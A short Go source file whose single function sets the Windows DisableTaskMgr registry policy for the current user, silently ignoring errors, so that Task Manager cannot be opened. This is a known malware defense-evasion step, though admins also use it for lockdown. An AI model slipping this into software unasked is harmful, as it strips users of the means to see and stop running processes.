package TaskManager

import "golang.org/x/sys/windows/registry"

func Disable() {
    key, _ := registry.OpenKey(registry.CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", registry.SET_VALUE|registry.CREATE_SUB_KEY)
    defer key.Close()

    _ = key.SetDWordValue("DisableTaskMgr", 1)
}